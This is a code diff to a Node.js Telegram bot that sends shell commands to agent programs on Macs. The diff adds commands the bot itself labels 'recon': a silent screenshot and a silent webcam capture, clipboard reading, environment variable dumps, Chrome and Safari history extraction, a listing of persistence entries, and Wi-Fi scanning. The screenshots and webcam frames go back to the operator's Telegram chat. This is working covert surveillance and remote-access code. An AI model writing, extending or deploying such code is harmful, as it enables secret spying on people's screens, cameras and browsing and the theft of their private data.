@@ -1,7 +1,4 @@
 require('dotenv').config();
-const fs  = require('fs');
-const os  = require('os');
-const path = require('path');
 const TelegramBot = require('node-telegram-bot-api');
 const express = require('express');
 const helmet = require('helmet');
@@ -86,8 +83,9 @@ bot.onText(/^\/start$/, (msg) => {
     `• \`/devices\` – list all Macs\n` +
     `• \`/run <cmd>\` – broadcast to all Macs\n` +
     `• \`/run @<hostname> <cmd>\` – specific Mac\n` +
+    `• \`/screenshot\` \`/webcam\` \`/clip\` – recon\n` +
     `• \`/config\` – view server config\n` +
-    `• \`/help\` – all commands`
+    `• \`/help\` – full command list`
   );
 });
 
@@ -96,22 +94,64 @@ bot.onText(/^\/help$/, (msg) => {
   if (!isAuthorized(msg)) return;
   reply(msg.chat.id,
     `*Commands*\n\n` +
-    `*Run commands:*\n` +
+    `*Run raw shell:*\n` +
     `\`/run <cmd>\` – broadcast to all Macs\n` +
-    `\`/run @<hostname> <cmd>\` – specific Mac\n\n` +
-    `*Built-in shortcuts (broadcast to all):*\n` +
-    `\`/sysinfo\` \`/procs\` \`/netstat\` \`/uptime\`\n` +
-    `\`/wifi\` \`/disk\` \`/screenshot\` \`/lock\` \`/sleep\`\n\n` +
+    `\`/run @<hostname> <cmd>\` – target one Mac\n\n` +
+    `*System info:*\n` +
+    `\`/sysinfo\` – hardware & OS overview\n` +
+    `\`/uptime\` – uptime & macOS version\n` +
+    `\`/procs\` – top CPU processes\n` +
+    `\`/disk\` – disk usage\n` +
+    `\`/battery\` – battery status\n` +
+    `\`/frontapp\` – currently focused app\n` +
+    `\`/idle\` – seconds since last user input\n` +
+    `\`/env\` – environment variables\n` +
+    `\`/crontabs\` – scheduled cron jobs\n\n` +
+    `*Screen & camera:*\n` +
+    `\`/screenshot\` – silent screenshot (all Macs)\n` +
+    `\`/webcam\` – silent webcam frame (all Macs)\n` +
+    `\`/lock\` – lock screen\n` +
+    `\`/sleep\` – sleep\n` +
+    `\`/darkmode\` – toggle dark mode\n\n` +
+    `*Clipboard:*\n` +
+    `\`/clip\` – get clipboard contents\n\n` +
+    `*Audio:*\n` +
+    `\`/volume\` – get output volume\n` +
+    `\`/mute\` – mute output\n` +
+    `\`/unmute\` – unmute output\n\n` +
+    `*Network:*\n` +
+    `\`/netstat\` – established connections\n` +
+    `\`/listening\` – listening ports\n` +
+    `\`/wifi\` – current Wi-Fi info\n` +
+    `\`/wifiscan\` – nearby networks\n` +
+    `\`/publicip\` – public IP address\n` +
+    `\`/arp\` – ARP table\n` +
+    `\`/routes\` – routing table\n` +
+    `\`/dns\` – DNS servers\n\n` +
+    `*Files:*\n` +
+    `\`/downloads\` – list ~/Downloads\n` +
+    `\`/recentfiles\` – recently modified files\n\n` +
+    `*Browser history:*\n` +
+    `\`/chromehistory\` – last 20 Chrome URLs\n` +
+    `\`/safarihistory\` – last 20 Safari URLs\n\n` +
+    `*Security:*\n` +
+    `\`/launchagents\` – persistence entries\n` +
+    `\`/firewall\` – firewall status\n` +
+    `\`/gatekeeper\` – Gatekeeper status\n` +
+    `\`/sip\` – SIP status\n\n` +
+    `*Power:*\n` +
+    `\`/restart\` – restart\n` +
+    `\`/shutdown\` – shutdown\n\n` +
     `*Devices:*\n` +
     `\`/devices\` – list all Macs with status\n` +
     `\`/forget @<hostname>\` – remove a device\n\n` +
-    `*Config (change VPS server):*\n` +
+    `*Config (bot server):*\n` +
     `\`/config\` – show current config\n` +
     `\`/setserver <url>\` – update bot server URL\n` +
     `\`/setsecret <secret>\` – update agent secret\n\n` +
     `*Releases (agent self-update):*\n` +
     `\`/release\` – show published release\n` +
-    `\`/setrelease <ver> <arm64-url> [amd64-url] [arm64-sha256] [amd64-sha256]\` – publish new release\n` +
+    `\`/setrelease <ver> <arm64-url> [amd64-url] [arm64-sha256] [amd64-sha256]\`\n` +
     `\`/update [@hostname]\` – force immediate update check\n\n` +
     `*Queue:*\n` +
     `\`/status\` – pending command counts\n` +
@@ -285,15 +325,59 @@ bot.onText(/^\/clear$/, (msg) => {
 
 // ── Built-in shortcut commands (broadcast to all) ─────────────────────────────
 const SHORTCUTS = {
-  '/sysinfo':    { cmd: 'system_profiler SPHardwareDataType SPSoftwareDataType 2>/dev/null' },
-  '/procs':      { cmd: 'ps aux | sort -rk 3 | head -20' },
-  '/netstat':    { cmd: 'lsof -i -n -P | grep ESTABLISHED' },
-  '/uptime':     { cmd: 'uptime && sw_vers' },
-  '/wifi':       { cmd: '/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I' },
-  '/disk':       { cmd: 'df -h' },
-  '/screenshot': { cmd: 'screencapture -t jpg /tmp/_sc.jpg && base64 /tmp/_sc.jpg && rm -f /tmp/_sc.jpg', type: 'screenshot' },
-  '/lock':       { cmd: "osascript -e 'tell application \"System Events\" to keystroke \"q\" using {command down, control down}'" },
-  '/sleep':      { cmd: 'pmset sleepnow' },
+  // System info
+  '/sysinfo':       { cmd: 'system_profiler SPHardwareDataType SPSoftwareDataType 2>/dev/null' },
+  '/uptime':        { cmd: 'uptime && sw_vers' },
+  '/procs':         { cmd: 'ps aux | sort -rk 3 | head -21' },
+  '/disk':          { cmd: 'df -h' },
+  '/battery':       { cmd: 'pmset -g batt' },
+  '/frontapp':      { cmd: `osascript -e 'tell application "System Events" to get name of first application process whose frontmost is true'` },
+  '/idle':          { cmd: `ioreg -c IOHIDSystem | awk '/HIDIdleTime/ {print int($NF/1000000000)" seconds idle"; exit}'` },
+  '/env':           { cmd: 'printenv | sort' },
+  '/crontabs':      { cmd: 'crontab -l 2>/dev/null; ls /etc/cron* 2>/dev/null' },
+
+  // Screen & camera
+  '/screenshot':    { cmd: 'screencapture -x -t jpg /tmp/_sc.jpg && base64 /tmp/_sc.jpg && rm -f /tmp/_sc.jpg', type: 'screenshot' },
+  '/webcam':        { cmd: 'ffmpeg -f avfoundation -video_size 1280x720 -framerate 30 -i "0" -frames:v 1 -y /tmp/_wc.jpg 2>/dev/null && base64 /tmp/_wc.jpg && rm -f /tmp/_wc.jpg', type: 'screenshot' },
+  '/lock':          { cmd: `osascript -e 'tell application "System Events" to keystroke "q" using {command down, control down}'` },
+  '/sleep':         { cmd: 'pmset sleepnow' },
+  '/darkmode':      { cmd: `osascript -e 'tell app "System Events" to tell appearance preferences to set dark mode to not dark mode'` },
+
+  // Clipboard
+  '/clip':          { cmd: 'pbpaste' },
+
+  // Audio
+  '/volume':        { cmd: `osascript -e 'output volume of (get volume settings)'` },
+  '/mute':          { cmd: `osascript -e 'set volume with output muted'` },
+  '/unmute':        { cmd: `osascript -e 'set volume without output muted'` },
+
+  // Network
+  '/netstat':       { cmd: 'lsof -i -n -P | grep ESTABLISHED' },
+  '/listening':     { cmd: 'lsof -iTCP -sTCP:LISTEN -n -P' },
+  '/wifi':          { cmd: '/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I' },
+  '/wifiscan':      { cmd: '/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s' },
+  '/publicip':      { cmd: 'curl -s https://api.ipify.org' },
+  '/arp':           { cmd: 'arp -a' },
+  '/routes':        { cmd: 'netstat -rn' },
+  '/dns':           { cmd: 'scutil --dns | grep nameserver | sort -u' },
+
+  // Files
+  '/downloads':     { cmd: 'ls -lah ~/Downloads/ | head -40' },
+  '/recentfiles':   { cmd: `find ~ -not -path '*/.*' -maxdepth 5 -type f -newer /tmp 2>/dev/null | head -25` },
+
+  // Browser history
+  '/chromehistory': { cmd: `sqlite3 ~/Library/Application\\ Support/Google/Chrome/Default/History 'SELECT datetime(last_visit_time/1000000-11644473600,"unixepoch","localtime"),title,url FROM urls ORDER BY last_visit_time DESC LIMIT 20;' 2>/dev/null` },
+  '/safarihistory': { cmd: `sqlite3 ~/Library/Safari/History.db 'SELECT datetime(visit_time+978307200,"unixepoch","localtime"),title,url FROM history_items JOIN history_visits ON history_items.id=history_visits.history_item ORDER BY visit_time DESC LIMIT 20;' 2>/dev/null` },
+
+  // Security / persistence
+  '/launchagents':  { cmd: 'ls -la ~/Library/LaunchAgents/ 2>/dev/null; ls -la /Library/LaunchAgents/ 2>/dev/null; ls -la /Library/LaunchDaemons/ 2>/dev/null' },
+  '/firewall':      { cmd: '/usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate' },
+  '/gatekeeper':    { cmd: 'spctl --status' },
+  '/sip':           { cmd: 'csrutil status' },
+
+  // Power
+  '/restart':       { cmd: 'shutdown -r now' },
+  '/shutdown':      { cmd: 'shutdown -h now' },
 };
 
 Object.entries(SHORTCUTS).forEach(([trigger, { cmd, type }]) => {
@@ -344,26 +428,17 @@ function waitForResult(id, chatId, hostname, cmd, type, deadline = Date.now() + 
         // Strip all whitespace (macOS base64 wraps at 76 chars) before decoding.
         const b64 = output.replace(/\s/g, '');
         const buf = Buffer.from(b64, 'base64');
-        // Write to a temp file and send as a ReadStream.
-        // This guarantees multipart/form-data upload via the Telegram API:
-        // passing a raw Buffer or { source } causes node-telegram-bot-api v0.66
-        // to URL-encode the binary data, producing a request URI so large that
-        // nginx returns 414 Request-URI Too Large.
-        const tmpFile = path.join(os.tmpdir(), `sc_${id}.jpg`);
-        fs.writeFile(tmpFile, buf, (writeErr) => {
-          if (writeErr) {
-            console.error(`[bot] writeFile failed for ${hostname}:`, writeErr.message);
-            reply(chatId, `📋 *${hostname}* — screenshot failed: ${writeErr.message}`);
-            return;
-          }
-          bot.sendPhoto(
-            chatId,
-            fs.createReadStream(tmpFile),
-            { caption: `📸 *${hostname}*`, parse_mode: 'Markdown' },
-          ).catch((err) => {
-            console.error(`[bot] sendPhoto failed for ${hostname}:`, err.message);
-            reply(chatId, `📋 *${hostname}* — screenshot failed: ${err.message}`);
-          }).finally(() => fs.unlink(tmpFile, () => {}));
+        // Use { source } form so node-telegram-bot-api sends the correct
+        // content-type (image/jpeg). Passing a raw Buffer as the 2nd arg with
+        // file options in the 4th arg is deprecated since 0.61 and causes
+        // Telegram to return IMAGE_PROCESS_FAILED.
+        bot.sendPhoto(
+          chatId,
+          { source: buf, filename: 'screenshot.jpg', contentType: 'image/jpeg' },
+          { caption: `📸 *${hostname}*`, parse_mode: 'Markdown' },
+        ).catch((err) => {
+          console.error(`[bot] sendPhoto failed for ${hostname}:`, err.message);
+          reply(chatId, `📋 *${hostname}* — screenshot failed: ${err.message}`);
         });
         return;
       }
